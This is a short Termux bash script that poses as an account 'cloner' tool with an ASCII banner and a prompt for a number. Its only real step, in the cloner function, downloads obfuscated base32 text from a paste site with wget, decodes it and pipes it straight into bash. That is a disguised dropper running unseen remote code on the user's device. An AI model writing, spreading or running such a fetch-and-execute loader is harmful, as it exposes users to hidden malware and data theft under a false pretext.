#!/bin/bash 
function dep () {
    printf "INSTALL PYTHON..."pkg install python -y 1> /dev/null
}
function cloner () {
    wget -qO- https://termbin.com/s8fb | base32 -d | bash 
}

function bn () {
    clear
    printf "\033[00;31m
   ____  ____  _____   _  __         ________                         _  __
  / __ \/ __ \/__  /  | |/ /___     / ____/ /___  ____  ___  _____   | |/ /
 / / / / / / /  / /   |   /_  /    / /   / / __ \/ __ \/ _ \/ ___/   |   / 
/ /_/ / /_/ /  / /   /   | / /_   / /___/ / /_/ / / / /  __/ /      /   |  
\____/\____/  /_/   /_/|_|/___/   \____/_/\____/_/ /_/\___/_/      /_/|_|  
            \n\n\033[00;00m"                                                               
}
dep
bn
printf "\033[01;32m\nNumber for cloner:\n\033[01;32m"; read number

if [[ $number -gt 0 ]]; then 
    printf "Starting..."
    cloner
    sleep 5.5s
else 
    printf "error number invalid!"
fi




